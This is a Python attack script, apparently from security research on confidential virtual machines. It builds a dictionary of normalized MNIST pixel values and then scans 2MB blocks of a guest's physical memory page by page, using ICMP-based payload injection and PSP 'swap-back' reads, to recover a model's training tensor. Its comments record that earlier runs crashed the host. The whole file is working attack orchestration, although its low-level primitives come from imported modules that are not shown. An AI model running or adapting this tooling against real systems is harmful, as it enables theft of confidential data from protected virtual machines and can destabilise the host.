#!/usr/bin/env python3
"""
mnist_dict_build.py — normalized-pixel-value dictionary + whole-block content
scan for the MNIST attacker.

Reuses ALL low-level plumbing from mura_dict_build.py (ICMP injection, PSP
swap-back read, SSH helpers) -- only the reference VALUES differ.

Why the values differ from MURA:
  MNIST's DataLoader tensor (the `data` object in main.py's train loop) is
  the tensor AFTER the full transform pipeline -- ToTensor() + Normalize
  ((0.1307,), (0.3081,)) -- both run inside Dataset.__getitem__, fully
  before collation/pin_memory, so there is no separate "pre-Normalize"
  buffer to chase; `data` IS the post-Normalize tensor. Verified live on the
  guest: raw pixel 0 (background) normalizes to exactly -0.4242129...,
  range is [-0.4242, 2.8215], NOT MURA's [0, 1] u8/255 range.

  Real-data density survey (torch.bincount over dataset.data, raw u8 0-255,
  since the transform is a bijection so raw-pixel density == normalized-
  value density) shows u8=0 (background) alone covers 80.9% of ALL MNIST
  pixels; top-5 values cover 87.9%; top-32 covers 90.3%. MNIST is far
  sparser than MURA -- a small reference dictionary should already recover
  most of an input tensor's content.

Why Phase 2 scans a WHOLE 2MB candidate block (512 pages), not a known-
offset/length image like mura_dict_build.py's --infer:
  Write-pattern tracking under-counts MNIST's reused (pin_memory) buffers
  badly -- bs=64 showed only 7/49 theoretical pages actually observed by
  the tracker (periodic re-arm blind window). Trusting write-pattern for an
  exact boundary is not viable. Content-based full-block scanning sidesteps
  this: every page in the candidate block is probed directly via swap-back
  read, independent of whether the write-tracker ever logged a write there.

Usage:
  sudo python3 mnist_dict_build.py --build --n-ref 16
  sudo python3 mnist_dict_build.py --scan-block --block-gpa 0x... --out block_scan.npy
"""
import argparse
import json
import sys
import time
from pathlib import Path

import numpy as np

MURA_DIR = Path(__file__).parent.parent / "mura"
sys.path.insert(0, str(MURA_DIR))
from mura_dict_build import (  # noqa: E402
    acquire_gpa, do_swap_read, parse_dump, drain_rxbuf, reload_icmp_module,
    ensure_mtu_9000, SWAP_TOOL, PAGE_SIZE, CHUNK_SIZE, CHUNKS_PAGE,
    SWAP_PACE_SEC, SWAP_BURST_COOLDOWN, SWAP_BURST_SLEEP,
)

HERE           = Path(__file__).parent
DICT_DIR       = HERE / "dict_pages_mnist"
DICT_CACHE     = HERE / "dict_cache_mnist.json"
SCAN_TMP       = HERE / "scan_tmp_mnist"
DENSITY_SURVEY = HERE / "mnist_density_survey.npy"   # raw-u8 histogram (from guest, torch.bincount)

BLOCK_SIZE       = 0x200000
PAGES_PER_BLOCK  = BLOCK_SIZE // PAGE_SIZE            # 512

# --- Safety ceilings on top of SWAP_PACE_SEC/SWAP_BURST_COOLDOWN, same
# values/rationale as llm_e2e_combined.py's Pacer (case_study/llm/), added
# there after the SAME 2026-09-04 host reboot this file's scan_block hit
# twice in a row at full 512-page scale: the every-10-swaps/2s burst
# cooldown alone was NOT enough to prevent a hard PSP/kernel hang over a
# long sustained run. Do not weaken these without re-validating on real
# hardware first (start with a small page count, not a full 512-page scan).
MEGA_COOLDOWN_EVERY = 50
MEGA_COOLDOWN_SLEEP = 12.0
MAX_TOTAL_SWAPS_RUN = 3200   # sized like llm's MAX_LOC_SWAPS_SAMPLE: worst
                             # case ~5 candidates x 512-page scan + margin


class RunAborted(Exception):
    pass


class Pacer:
    """Call .tick() immediately before each swap-read. Create ONE instance
    per mnist_e2e.py run and thread it through every scan_block() call so
    the cumulative swap count (and therefore MEGA cooldown timing and the
    hard MAX_TOTAL_SWAPS_RUN ceiling) spans the whole run, not just one
    candidate block."""
    def __init__(self, max_total: int = MAX_TOTAL_SWAPS_RUN):
        self.n = 0
        self.max_total = max_total

    def tick(self):
        if self.n >= self.max_total:
            raise RunAborted(f"MAX_TOTAL_SWAPS_RUN={self.max_total} reached")
        if MEGA_COOLDOWN_EVERY and self.n and self.n % MEGA_COOLDOWN_EVERY == 0:
            print(f"  [pace] MEGA cooldown after {self.n} swaps ({MEGA_COOLDOWN_SLEEP:.0f}s)")
            time.sleep(MEGA_COOLDOWN_SLEEP)
        elif SWAP_BURST_COOLDOWN and self.n and self.n % SWAP_BURST_COOLDOWN == 0:
            time.sleep(SWAP_BURST_SLEEP)
        else:
            time.sleep(SWAP_PACE_SEC)
        self.n += 1

MNIST_MEAN, MNIST_STD = 0.1307, 0.3081
DRAIN_EVERY = 16


def normalize_u8(u8: int) -> np.float32:
    """Exact float32 value a raw pixel level u8 (0-255) becomes after
    ToTensor (/255) + Normalize((0.1307,), (0.3081,)). Verified live on the
    guest: normalize_u8(0) == -0.4242129... bit-for-bit."""
    return (np.float32(u8) / np.float32(255) - np.float32(MNIST_MEAN)) / np.float32(MNIST_STD)


def make_ref_chunk(u8_val: int) -> bytes:
    """4 float32 copies of the normalized value = 16 bytes (matches
    mura_dict_build.py's chunk convention -- CHUNK_SIZE=16)."""
    v = np.array([normalize_u8(u8_val)], dtype=np.float32)
    return np.tile(v.view(np.uint8), 4).tobytes()


def load_ref_u8_list(n_ref: int) -> list[int]:
    if not DENSITY_SURVEY.exists():
        raise FileNotFoundError(
            f"{DENSITY_SURVEY} not found. Compute it on the guest first:\n"
            f"  torch.bincount(dataset.data.flatten().long(), minlength=256)\n"
            f"then scp mnist_density_survey.npy here."
        )
    hit = np.load(DENSITY_SURVEY)
    return np.argsort(-hit)[:n_ref].tolist()


# ── Phase 0: build dictionary ───────────────────────────────────────────────
def build(swap_tool: str, n_ref: int) -> None:
    ref_u8 = load_ref_u8_list(n_ref)
    ref_chunks = {u8: make_ref_chunk(u8) for u8 in ref_u8}

    DICT_DIR.mkdir(exist_ok=True)
    print(f"[build] {len(ref_u8)} ref values (top-{n_ref} by real MNIST pixel density): {ref_u8}")
    for u8 in ref_u8[:5]:
        print(f"    u8={u8:3d} -> normalized={normalize_u8(u8):.6f}")

    print("[build] Reloading guest ICMP module to reset rate-limit state...")
    reload_icmp_module()

    cache: dict = {"fixed_gpa": None, "mean": MNIST_MEAN, "std": MNIST_STD,
                   "n_ref": n_ref, "refs": {}}

    print("\n[build] Acquiring FIXED_GPA (zero payload)...")
    fixed_gpa = acquire_gpa(None)
    cache["fixed_gpa"] = hex(fixed_gpa)
    with open(DICT_CACHE, "w") as f:
        json.dump(cache, f, indent=2)
    print(f"  FIXED_GPA = 0x{fixed_gpa:x}")

    for i, u8_val in enumerate(ref_u8):
        norm_val = normalize_u8(u8_val)
        print(f"\n[{i+1:2d}/{len(ref_u8)}] u8={u8_val:3d}  normalized={norm_val:.6f}  "
              f"chunk={ref_chunks[u8_val].hex()}")

        if i > 0 and i % DRAIN_EVERY == 0:
            print("  [drain] flushing guest ICMP buffer + reloading module...")
            drain_rxbuf()
            reload_icmp_module()

        out_path = DICT_DIR / f"ref_{u8_val:03d}.out"

        gpa_refX = acquire_gpa(u8_val, chunk_bytes=ref_chunks[u8_val])
        print(f"  GPA_ref{u8_val:03d} = 0x{gpa_refX:x}")

        if gpa_refX == fixed_gpa:
            print("  [!] GPA_refX == FIXED_GPA, retry...")
            drain_rxbuf()
            gpa_refX = acquire_gpa(u8_val, chunk_bytes=ref_chunks[u8_val])
            if gpa_refX == fixed_gpa:
                print(f"  [!] Still same GPA — skipping u8={u8_val}", file=sys.stderr)
                continue

        print(f"  do_swap_read(0x{fixed_gpa:x}, 0x{gpa_refX:x}) -> {out_path.name}")
        do_swap_read(fixed_gpa, gpa_refX, out_path, swap_tool)
        time.sleep(6)   # let printk_ratelimited 5s window expire before next item

        cache["refs"][str(u8_val)] = {
            "ref_gpa": hex(gpa_refX), "fixed_gpa": hex(fixed_gpa), "file": str(out_path),
        }
        with open(DICT_CACHE, "w") as f:
            json.dump(cache, f, indent=2)

    n_done = len(cache["refs"])
    print(f"\n[build] Done. {n_done}/{len(ref_u8)} refs -> {DICT_CACHE}")


# ── Phase 2: whole-block content scan (no assumed offset/length) ───────────
def load_ref_dumps(cache: dict) -> dict[int, bytes]:
    """entry["file"] was recorded relative to whatever cwd --build happened to
    run from, so it does not reliably resolve later (e.g. from a different
    invocation directory). Prefer the canonical DICT_DIR / ref_NNN.out path;
    fall back to the recorded path only if that canonical file is missing."""
    ref_dumps = {}
    for u8_str, entry in cache["refs"].items():
        u8 = int(u8_str)
        canonical = DICT_DIR / f"ref_{u8:03d}.out"
        path = canonical if canonical.exists() else Path(entry["file"])
        ref_dumps[u8] = parse_dump(path)
    if not ref_dumps:
        print("[!] No ref dumps in cache -- run --build first.", file=sys.stderr)
        sys.exit(1)
    return ref_dumps


def scan_block(fixed_gpa: int, block_base: int, ref_dumps: dict[int, bytes],
               swap_tool: str, pacer: "Pacer | None" = None) -> np.ndarray:
    """Probe all 512 pages of a 2MB candidate block. For each of the 256
    16-byte chunk positions per page, record which reference u8 value (if
    any) it exactly matches -- position-wise (chunk j vs chunk j), same rule
    as mura_dict_build.py's infer(). Returns (512, 256) int16, -1 = no match,
    else the matched raw pixel level (0-255).

    pacer: pass one Pacer instance shared across every scan_block() call in
    a run (e.g. across multiple candidate blocks) so MEGA-cooldown timing
    and MAX_TOTAL_SWAPS_RUN reflect the TOTAL swap volume, not just this
    call's. Raises RunAborted if that ceiling is hit -- treat as a failed
    run, not a bug to retry past. A fresh, call-scoped Pacer is created if
    none is given (standalone --scan-block CLI use)."""
    if pacer is None:
        pacer = Pacer()
    result = np.full((PAGES_PER_BLOCK, CHUNKS_PAGE), -1, dtype=np.int16)
    SCAN_TMP.mkdir(exist_ok=True)

    for k in range(PAGES_PER_BLOCK):
        page_gpa = block_base + k * PAGE_SIZE
        tmp = SCAN_TMP / f"scan_{page_gpa:x}.out"
        # PSP command-rate pacing -- see the Pacer docstring. A 512-page
        # tight loop with insufficient pacing rebooted the host (2026-08-25,
        # again 2026-09-04 x2); do not remove or weaken this.
        pacer.tick()
        try:
            do_swap_read(fixed_gpa, page_gpa, tmp, swap_tool)
            data = parse_dump(tmp)
        except Exception as e:
            print(f"  [!] page {k}/512 (0x{page_gpa:x}) probe failed: {e}", file=sys.stderr)
            continue
        finally:
            tmp.unlink(missing_ok=True)

        for j in range(CHUNKS_PAGE):
            off = j * CHUNK_SIZE
            chunk = data[off:off + CHUNK_SIZE]
            for u8_val, ref_bytes in ref_dumps.items():
                if chunk == ref_bytes[off:off + CHUNK_SIZE]:
                    result[k, j] = u8_val
                    break

        if k % 64 == 0:
            hit_so_far = int((result[:k+1] >= 0).sum())
            print(f"  page {k:3d}/512  cumulative matched chunks: {hit_so_far}")

    return result


def main() -> None:
    p = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--build", action="store_true", help="Build the reference dictionary")
    p.add_argument("--n-ref", type=int, default=1,
                   help="number of reference values, top-N by real MNIST pixel density "
                        "(default: 1 -- u8=0 background alone, 80.9%% of all pixels)")
    p.add_argument("--scan-block", action="store_true",
                   help="Content-scan one 2MB candidate block (no assumed offset/length)")
    p.add_argument("--block-gpa", type=lambda x: int(x, 0), default=None,
                   help="2MB-aligned base GPA of the candidate block to scan")
    p.add_argument("--out", default="block_scan.npy", help="Output .npy for --scan-block")
    p.add_argument("--swap-tool", default=str(SWAP_TOOL))
    args = p.parse_args()

    if args.build:
        ensure_mtu_9000()
        build(args.swap_tool, args.n_ref)
    elif args.scan_block:
        if args.block_gpa is None:
            p.error("--scan-block requires --block-gpa 0x...")
        if not DICT_CACHE.exists():
            print(f"[!] {DICT_CACHE} not found -- run --build first.", file=sys.stderr)
            sys.exit(1)
        with open(DICT_CACHE) as f:
            cache = json.load(f)
        fixed_gpa = int(cache["fixed_gpa"], 16)
        ref_dumps = load_ref_dumps(cache)
        print(f"[scan] {len(ref_dumps)} reference pages loaded")
        print(f"[scan] block 0x{args.block_gpa:x}  ({PAGES_PER_BLOCK} pages)")

        result = scan_block(fixed_gpa, args.block_gpa, ref_dumps, args.swap_tool)
        np.save(args.out, result)

        matched = int((result >= 0).sum())
        total = result.size
        print(f"\n[scan] matched {matched}/{total} chunks ({100*matched/total:.1f}%)")
        pages_with_any_match = int((result >= 0).any(axis=1).sum())
        print(f"[scan] pages with >=1 match: {pages_with_any_match}/{PAGES_PER_BLOCK}")
        print(f"[scan] saved -> {args.out}")
    else:
        p.print_help()


if __name__ == "__main__":
    main()
